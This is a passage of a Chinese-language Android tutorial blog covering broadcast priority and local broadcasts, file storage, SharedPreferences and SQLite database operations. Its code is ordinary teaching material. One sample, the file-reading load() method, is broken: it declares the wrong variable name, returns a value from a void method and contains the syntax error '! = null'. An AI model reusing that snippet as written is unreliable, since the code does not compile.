class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接收时，通过<code>android.priority</code>属性来设置优先级</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;.MyBroadcastReceiver&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:enabled</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span> <span class="attr">android:priority</span>=<span class="string">&quot;100&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.example.broadcasttest.MY_BROADCAST&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>同时通过<code>abortBroadcast()</code>方法来截断广播（之后的广播接收器无法收到）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">    Toast.makeText(context, <span class="string">&quot;received in MyBroadcastReceiver&quot;</span>,</span><br><span class="line">        Toast.LENGTH_SHORT).show();</span><br><span class="line">    abortBroadcast();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="使用本地广播"><a href="#使用本地广播" class="headerlink" title="使用本地广播"></a>使用本地广播</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> IntentFilter intentFilter;</span><br><span class="line">    <span class="keyword">private</span> LocalReceiver localReceiver;</span><br><span class="line">    <span class="keyword">private</span> LocalBroadcastManager localBroadcastManager;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        localBroadcastManager = LocalBroadcastManager.getInstance(<span class="built_in">this</span>); <span class="comment">// 获取实例</span></span><br><span class="line">        <span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> (Button) findViewById(R.id.button);</span><br><span class="line">        button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;com.example.broadcasttest.LOCAL_BROADCAST&quot;</span>);</span><br><span class="line">                localBroadcastManager.sendBroadcast(intent); <span class="comment">// 发送本地广播</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        intentFilter = <span class="keyword">new</span> <span class="title class_">IntentFilter</span>();</span><br><span class="line">        intentFilter.addAction(<span class="string">&quot;com.example.broadcasttest.LOCAL_BROADCAST&quot;</span>);</span><br><span class="line">        localReceiver = <span class="keyword">new</span> <span class="title class_">LocalReceiver</span>();</span><br><span class="line">        localBroadcastManager.registerReceiver(localReceiver, intentFilter); <span class="comment">// 注</span></span><br><span class="line">        册本地广播监听器</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onDestroy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onDestroy();</span><br><span class="line">        localBroadcastManager.unregisterReceiver(localReceiver);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">LocalReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">            Toast.makeText(context, <span class="string">&quot;received local broadcast&quot;</span>, Toast.LENGTH_SHORT).</span><br><span class="line"></span><br><span class="line">               show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>与动态注册广播接收器一样，不过现在是通过LocalBroadcastManager的getInstance() 方法得到了它的一个实例，然后在注册广播接收器的时候调用的是LocalBroadcastManager的registerReceiver() 方法，在发送广播的时候调用的是LocalBroadcastManager的sendBroadcast() 方法</p><p><strong>本地广播是无法通过静态注册的方式来接收</strong></p><h2 id="数据存储"><a href="#数据存储" class="headerlink" title="数据存储"></a>数据存储</h2><h3 id="文件存储"><a href="#文件存储" class="headerlink" title="文件存储"></a>文件存储</h3><ul><li><p>Context 类中提供了一个openFileOutput() 方法，可以用于将数据存储到指定的文件中。</p></li><li><p>第一个参数为文件名（默认存储到/data/data/<package name>/files/目录下）</p></li><li>第二个参数是文件的操作模式，主要有两种模式可选，MODE_PRIVATE和MODE_APPEND。其中MODE_PRIVATE是默认的操作模式，表示当指定同样文件名的时候，所写入的内容将会覆盖原文件中的内容，而MODE_APPEND则表示如果该文件已存在，就往文件里面追加内容，不存在就创建新文件。</li><li>返回的是一个FileOutputStream 对象</li><li>Context 类中还提供了一个openFileInput() 方法，用于从文件中读取数据。</li><li>只接收一个参数，即要读取的文件名</li></ul><h4 id="数据存储文件中"><a href="#数据存储文件中" class="headerlink" title="数据存储文件中"></a>数据存储文件中</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">save</span><span class="params">()</span>&#123;</span><br><span class="line">        String data=<span class="string">&quot;Data to save&quot;</span>;</span><br><span class="line">        FileOutputStream out=<span class="literal">null</span>;</span><br><span class="line">        BufferedWriter writer=<span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            out=openFileOutput(<span class="string">&quot;data&quot;</span>, Context.MODE_PRIVATE);</span><br><span class="line">            writer=<span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">OutputStreamWriter</span>(out));</span><br><span class="line">            writer.write(data);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;                                          </span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(writer!=<span class="literal">null</span>) &#123;</span><br><span class="line">                    writer.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span>(IOException e )&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="文件中读取数据"><a href="#文件中读取数据" class="headerlink" title="文件中读取数据"></a>文件中读取数据</h4><p>Context类提供一个openFileInput()方法，用于从文件中读取数据，只有一个参数为文件名。自动从/data/data/<package name>/files/目录下读取文件内容，返回一个对象FileInputStream</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">load</span>()&#123;</span><br><span class="line">        FileInputStream in=<span class="literal">null</span>;</span><br><span class="line">        <span class="built_in">BufferedReader</span> writer=<span class="literal">null</span>;</span><br><span class="line">        StringBuilder content=<span class="keyword">new </span><span class="class title_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            in=<span class="title function_">openFileInput</span>(<span class="string">&quot;data&quot;</span>);</span><br><span class="line">            reader=<span class="keyword">new </span><span class="class title_">BufferedReader</span>(<span class="keyword">new </span><span class="class title_">InputStreamReader</span>(in));</span><br><span class="line">            <span class="built_in">String</span> <span class="built_in">line</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">while</span>((<span class="built_in">line</span>=reader.<span class="property">readLine</span>())! = <span class="literal">null</span>)&#123;</span><br><span class="line">            content.<span class="property">append</span>(<span class="built_in">line</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="title function_">catch</span> (IOException e) &#123;</span><br><span class="line">            e.<span class="property">printStackTrace</span>();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;                                          </span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(reader!=<span class="literal">null</span>) &#123;</span><br><span class="line">                    reader.<span class="property">close</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="title function_">catch</span>(IOException e )&#123;</span><br><span class="line">                e.<span class="property">printStackTrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> content.<span class="property">toString</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="SharedPreferences存储"><a href="#SharedPreferences存储" class="headerlink" title="SharedPreferences存储"></a>SharedPreferences存储</h3><h4 id="获取SharedPreferences对象"><a href="#获取SharedPreferences对象" class="headerlink" title="获取SharedPreferences对象"></a>获取SharedPreferences对象</h4><ul><li><p>Context 类中的getSharedPreferences() 方法</p><ul><li>第一个参数用于指定SharedPreferences文件的名称，如果指定的文件不存在则会创建一个，SharedPreferences文件都是存放在/data/data/<package name>/shared_prefs/目录下</li><li>第二个参数用于指定操作模式，目前只有MODE_PRIVATE这一种模式可选，它是默认的操作模式，和直接传入0效果是相同的，表示只有当前的应用程序才可以对这个SharedPreferences文件进行读写。其他几种操作模式均已被废弃</li></ul></li><li>Activity 类中的getPreferences() 方法<ul><li>它只接收一个操作模式参数。会自动将当前活动的类名作为SharedPreferences的文件名。</li></ul></li><li>PreferenceManager 类中的getDefaultSharedPreferences() 方法<ul><li>这是一个静态方法，它接收一个Context 参数，并自动使用当前应用程序的包名作为前缀来命名SharedPreferences文件</li></ul></li></ul><h4 id="存储数据"><a href="#存储数据" class="headerlink" title="存储数据"></a>存储数据</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SharedPreferences.<span class="type">Editor</span> <span class="variable">editor</span> <span class="operator">=</span> getSharedPreferences(<span class="string">&quot;data&quot;</span>, MODE_PRIVATE).edit();</span><br><span class="line">editor.putString(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;Tom&quot;</span>);</span><br><span class="line">editor.putInt(<span class="string">&quot;age&quot;</span>, <span class="number">28</span>);</span><br><span class="line">editor.putBoolean(<span class="string">&quot;married&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">editor.apply();</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="读取数据"><a href="#读取数据" class="headerlink" title="读取数据"></a>读取数据</h4><p>get方法两个参数：</p><p>第一个参数是键值，</p><p>第二个默认值，即表示当传入的键找不到对应数据时以什么值返回</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SharedPreferences</span> <span class="variable">pref</span> <span class="operator">=</span> getSharedPreferences(<span class="string">&quot;data&quot;</span>, MODE_PRIVATE); </span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> pref.getString(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> pref.getInt(<span class="string">&quot;age&quot;</span>,<span class="number">0</span>);</span><br><span class="line"><span class="type">boolean</span> <span class="variable">married</span> <span class="operator">=</span> pref.getBoolean(<span class="string">&quot;married&quot;</span>,<span class="literal">false</span>);</span><br></pre></td></tr></table></figure><h3 id="SQLite数据库存储"><a href="#SQLite数据库存储" class="headerlink" title="SQLite数据库存储"></a>SQLite数据库存储</h3><h4 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h4><p>提供了一个SQLiteOpenHelper帮助类，借助这个类就可以非常简单地对数据库进行创建和升级。SQLiteOpenHelper是一个抽象类</p><p>SQLiteOpenHelper中有两个抽象方法，分别是onCreate() 和onUpgrade() ，我们必须在自己的帮助类里面重写这两个方法，然后分别在这两个方法中去实现创建、升级数据库的逻辑。<br>SQLiteOpenHelper中还有两个非常重要的实例方法：getReadableDatabase() 和getWritableDatabase() 。这两个方法都可以创建或打开一个现有的数据库（如果数据库已存在则直接打开，否则创建一个新的数据库），并返回一个可对数据库进行读写操作的对象。</p><p>不同的是，当数据库不可写入的时候getReadableDatabase() 方法返回的对象将以只读的方式去打开数据库，而getWritableDatabase() 方法则将出现异常。</p><p><strong>SQLiteOpenHelper构造方法</strong></p><ul><li><p>较少参数构造方法接收4个参数</p><ul><li>第一个参数是Context</li><li>第二个参数是数据库名，创建数据库时使用的就是这里指定的名称。</li><li>第三个参数允许我们在查询数据的时候返回一个自定义的Cursor，一般都是传入null 。</li><li>第四个参数表示当前数据库的版本号，可用于对数据库进行升级操作。</li><li>构建出SQLiteOpenHelper的实例之后，再调用它的getReadableDatabase() 或getWritableDatabase() 方法就能够创建数据库了，数据库文件会存放在/data/data/ <package name>/databases/目录下。</li><li>此时，重写的onCreate() 方法也会得到执行，所以通常会在这里去处理一些创建表的逻辑。</li></ul></li></ul><p><strong>Book表的建表语句</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> Book(</span><br><span class="line">id <span class="type">integer</span> <span class="keyword">primary key</span> autoincrement,</span><br><span class="line">author <span class="type">text</span>,</span><br><span class="line">price <span class="type">real</span>,</span><br><span class="line">pages <span class="type">integer</span>,</span><br><span class="line"><span class="type">name</span> <span class="type">text</span>)</span><br></pre></td></tr></table></figure><p>SQLite不像其他的数据库拥有众多繁杂的数据类型，它的数据类型很简单，integer 表示整型，real 表示浮点型，text 表示文本类型，blob 表示二进制类</p><p>primary key：设置主键 </p><p>autoincrement：表示列是自增长的</p><p><strong>创库建表：新建一个类继承SQLiteOpenHelper</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyDatabaseHelper</span> <span class="keyword">extends</span> <span class="title class_">SQLiteOpenHelper</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CREATE_BOOK</span> <span class="operator">=</span> <span class="string">&quot;create table Book (&quot;</span></span><br><span class="line">            + <span class="string">&quot;id integer primary key autoincrement, &quot;</span></span><br><span class="line">            + <span class="string">&quot;author text, &quot;</span></span><br><span class="line">            + <span class="string">&quot;price real, &quot;</span></span><br><span class="line">            + <span class="string">&quot;pages integer, &quot;</span></span><br><span class="line">            + <span class="string">&quot;name text)&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Context mContext;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyDatabaseHelper</span><span class="params">(Context context, String name,</span></span><br><span class="line"><span class="params">                            SQLiteDatabase.CursorFactory factory, <span class="type">int</span> version)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(context, name, factory, version);</span><br><span class="line">        mContext = context;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(SQLiteDatabase db)</span> &#123;</span><br><span class="line">        db.execSQL(CREATE_BOOK);</span><br><span class="line">        Toast.makeText(mContext, <span class="string">&quot;Create succeeded&quot;</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onUpgrade</span><span class="params">(SQLiteDatabase db, <span class="type">int</span> oldVersion, <span class="type">int</span> newVersion)</span> &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>创库建表：MainActivity</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> MyDatabaseHelper dbHelper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        dbHelper = <span class="keyword">new</span> <span class="title class_">MyDatabaseHelper</span>(<span class="built_in">this</span>, <span class="string">&quot;BookStore.db&quot;</span>, <span class="literal">null</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">createDatabase</span> <span class="operator">=</span> (Button) findViewById(R.id.create_database);</span><br><span class="line">        createDatabase.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                dbHelper.getWritableDatabase();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>数据库中添加一个表</strong></p><p>方法一：可以删除程序，然后在相应位置添加<code>db.execSQL(CREATE_XXX);</code>再次调用getWritableDatabase()创建库，调用onCreate方法。</p><p>方法二：</p><p>修改onUpgrade方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onUpgrade</span><span class="params">(SQLiteDatabase db, <span class="type">int</span> oldVersion, <span class="type">int</span> newVersion)</span> &#123;</span><br><span class="line">        db.execSQL(<span class="string">&quot;drop table if exists Book&quot;</span>);</span><br><span class="line">        db.execSQL(<span class="string">&quot;drop table if exists Category&quot;</span>);</span><br><span class="line">        onCreate(db);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>然后在MainActivity中修改数据库等级就会调用Upgrade方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> MyDatabaseHelper dbHelper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        </span><br><span class="line">        dbHelper = <span class="keyword">new</span> <span class="title class_">MyDatabaseHelper</span>(<span class="built_in">this</span>, <span class="string">&quot;BookStore.db&quot;</span>, <span class="literal">null</span>, <span class="number">2</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="type">Button</span> <span class="variable">createDatabase</span> <span class="operator">=</span> (Button) findViewById(R.id.create_database);</span><br><span class="line">        createDatabase.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                dbHelper.getWritableDatabase();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="添加数据"><a href="#添加数据" class="headerlink" title="添加数据"></a><strong>添加数据</strong></h4><p>insert方法，三个参数</p><ul><li>参数一：表名</li><li>参数二：未指定添加数据的情况下给某些可为空的列自动赋值null，一般不用这个功能，直接传入null</li><li>ContentValues对象：提供了put方法，用于添加数据</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">SQLiteDatabase</span> <span class="variable">db</span> <span class="operator">=</span> dbHelper.getWritableDatabase();</span><br><span class="line">                <span class="type">ContentValues</span> <span class="variable">values</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContentValues</span>();</span><br><span class="line">                <span class="comment">// 开始组装第一条数据</span></span><br><span class="line">                values.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;The Da Vinci Code&quot;</span>);</span><br><span class="line">                values.put(<span class="string">&quot;author&quot;</span>, <span class="string">&quot;Dan Brown&quot;</span>);</span><br><span class="line">                values.put(<span class="string">&quot;pages&quot;</span>, <span class="number">454</span>);</span><br><span class="line">                values.put(<span class="string">&quot;price&quot;</span>, <span class="number">16.96</span>);</span><br><span class="line">                db.insert(<span class="string">&quot;Book&quot;</span>, <span class="literal">null</span>, values); <span class="comment">// 插入第一条数据</span></span><br><span class="line">                values.clear();</span><br><span class="line">                <span class="comment">// 开始组装第二条数据</span></span><br><span class="line">                values.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;The Lost Symbol&quot;</span>);</span><br><span class="line">                values.put(<span class="string">&quot;author&quot;</span>, <span class="string">&quot;Dan Brown&quot;</span>);</span><br><span class="line">                values.put(<span class="string">&quot;pages&quot;</span>, <span class="number">510</span>);</span><br><span class="line">                values.put(<span class="string">&quot;price&quot;</span>, <span class="number">19.95</span>);</span><br><span class="line">                db.insert(<span class="string">&quot;Book&quot;</span>, <span class="literal">null</span>, values); <span class="comment">// 插入第二条数据</span></span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><h4 id="更新数据"><a href="#更新数据" class="headerlink" title="更新数据"></a>更新数据</h4><p>update方法，四个参数</p><ul><li>参数一：表名</li><li>参数二：ContentValues对象，添加更新数据</li><li>三，四个参数：用于约束更新某一行或某几行中的数据，不指定的话默认更新所有行</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">SQLiteDatabase</span> <span class="variable">db</span> <span class="operator">=</span> dbHelper.getWritableDatabase();</span><br><span class="line">                <span class="type">ContentValues</span> <span class="variable">values</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContentValues</span>();</span><br><span class="line">                values.put(<span class="string">&quot;price&quot;</span>, <span class="number">10.99</span>);</span><br><span class="line">                db.update(<span class="string">&quot;Book&quot;</span>, values, <span class="string">&quot;name = ?&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;The Da Vinci Code&quot;</span> &#125;);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><h4 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h4><p>delete方法，三个参数</p><ul><li>参数一：表名</li><li>参数二，三：用于约束删除某一行或某几行中的数据，不指定的话默认删除所有行</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">SQLiteDatabase</span> <span class="variable">db</span> <span class="operator">=</span> dbHelper.getWritableDatabase();</span><br><span class="line">                db.delete(<span class="string">&quot;Book&quot;</span>, <span class="string">&quot;pages &gt; ?&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;500&quot;</span> &#125;);</span><br><span class="line">            